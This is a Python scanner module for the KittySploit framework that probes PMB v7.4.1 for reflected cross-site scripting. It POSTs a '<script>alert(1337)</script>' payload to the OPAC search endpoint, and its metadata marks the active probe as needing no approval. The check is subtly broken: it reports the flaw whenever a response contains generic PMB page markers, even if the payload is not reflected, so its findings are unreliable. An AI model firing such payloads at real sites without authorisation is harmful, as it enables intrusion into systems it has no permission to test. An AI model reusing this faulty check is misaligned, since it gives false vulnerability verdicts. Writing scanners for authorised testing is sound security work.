#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""PMB v7."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'PMB v7.4.1 - Cross Site Scripting Detection',
        'description': 'PMB v7.4.1 allow attacker to inject arbitrary malicious HTML or Javascripts code in user web browser via no_search parameter',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'xss', 'pmb', 'cms', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': ['https://github.com/jenaye/PMB'],
    }

    def run(self):
        path = '/pmb/opac_css/index.php?lvl=search_result&search_type_asked=extended_search'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='add_field=&search%5B%5D=f_1&op_0_f_1=EXACT&field_0_f_1%5B%5D=gang&explicit_search=1&search_xml_file=search_fields&delete_field=&launch_search=1&page=&no_search=0&ij6fm%22%3e%3cscript%3ealert(1337)%3c%2fscript%3evg9q6c4g1mk=1\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('<script>alert(1337)</script>', 'PMB Group', 'pmbDojo',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='PMB v7.4.1 - Cross Site Scripting detected', path=path)
            return True
        return False

